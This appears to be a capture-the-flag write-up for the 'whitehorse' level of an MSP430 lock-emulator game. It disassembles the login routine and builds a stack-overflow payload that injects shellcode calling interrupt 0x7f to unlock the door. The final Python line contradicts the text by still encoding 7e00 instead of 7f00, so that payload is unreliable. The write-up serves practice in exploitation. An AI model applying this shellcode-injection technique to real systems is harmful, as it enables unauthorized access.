# whitehorse writeup

let's have a look at the different functions first:

**`<main>**:`

Lets look at the **`<main>`** function first, for this level it simply calls another function **`<login>`**

```asm
4438 <main>
4438:  b012 f444      call  #0x44f4 <login>
```

**`<login>**:`

this function doesn't look that interesting, but it calls another function: **<conditional_unlock_door>**

it prints ***“Access granted."*** or ***“That password is not correct."***

**!: Remember: passwords are between 8 and 16 characters.**

```asm
44f4 <login>
44f4: 3150 f0ff add #0xfff0, sp
44f8: 3f40 7044 mov #0x4470 "Enter the password to continue.", r15
44fc: b012 9645 call #0x4596 <puts>
4500: 3f40 9044 mov #0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504: b012 9645 call #0x4596 <puts>
4508: 3e40 3000 mov #0x30, r14
450c: 0f41 mov sp, r15
450e: b012 8645 call #0x4586 <getsn>
4512: 0f41 mov sp, r15
4514: b012 4644 call #0x4446 <conditional_unlock_door
4518: 0f93 tst r15
451a: 0324 jz #0x4522 <login+0x2e>
451c: 3f40 c544 mov #0x44c5 "Access granted.", r15
4520: 023c jmp #0x4526 <login+0x32>
4522: 3f40 d544 mov #0x44d5 "That password is not correct.", r15
4526: b012 9645 call #0x4596 <puts>
452a: 3150 1000 add #0x10, sp
452e: 3041 ret
```

**`<conditional_unlock_door>:`**

```asm
4446 <conditional_unlock_door>
4446:  0412           push  r4
4448:  0441           mov   sp, r4
444a:  2453           incd  r4
444c:  2183           decd  sp
444e:  c443 fcff      mov.b #0x0, -0x4(r4)
4452:  3e40 fcff      mov   #0xfffc, r14
4456:  0e54           add   r4, r14
4458:  0e12           push  r14
445a:  0f12           push  r15
445c:  3012 7e00      push  #0x7e ; lets have a look at the manual!
4460:  b012 3245      call  #0x4532 <INT>
4464:  5f44 fcff      mov.b -0x4(r4), r15
4468:  8f11           sxt   r15
446a:  3152           add   #0x8, sp
446c:  3441           pop   r4
446e:  3041           ret
```

***INT 0x7E:***

***Interface with the HSM-2. Trigger the deadbolt unlock if the password is
correct.***

***Takes one argument: the password to test.***

but after reading it for a while I noticed that I have to change it to this:

***INT 0x7F***

***``Interface with deadbolt to trigger an unlock if the password is correct.
Takes no arguments.``***

let's start debugging and enter a password:

I quickly realized that I can control the stack and after asking someone if I can call my own interrupt I simply did that.

let's have a look at this two instructions:

```asm
445c:  3012 7e00      push  #0x7e
4460:  b012 3245      call  #0x4532 <INT>
```

I just took `3012 7e00 b012 3245` for my own input to call 0x7e

I first asked myself what my payload should look like so I looked at the password buffer:

after playing around with the debugger I noticed that my password buffer starts at `3c72`

> read sp
 
3c6a:   0200 723c 3000 1245  ..r<0..E

3c72:   4242 4242 4242 4242  BBBBBBBB

3c7a:   4242 4242 4242 4242  BBBBBBBB

3c82:   4242 4242 0000 0000  BBBB....

( I entered 20 B's )

> read sp

3c82:   4242 4242 0000 0000  BBBB....|

3c8a:   0000 0000 0000 0000  ........|

3c92:   0000 0000 0000 0000  ........|

3c9a:   0000 0000 0000 0000  ........|
        ^^
the `stack pointer` is here

so the `ret` will jump to the address at the 17-18th position of the password buffer 

Payload (hex encoded):

the first 8 bytes will be `3012 7f00 b012 3245` for my changed interrupt

`7e00` (I had to change that to `7f00` to trigger **INT 0x7f**)

the next 8 bytes are `4242424242424242` (you obviously can also enter other for example `41` 8 times )

the last 2 bytes are `3c72`

as you already know MSP 430 is `little endian` so it's `723c`

i did it with a python shell:

```python
>>> print('30127e00b0123245'+'41'*8+'723c')
```

this level was pretty tricky!

solved: 14.3.20
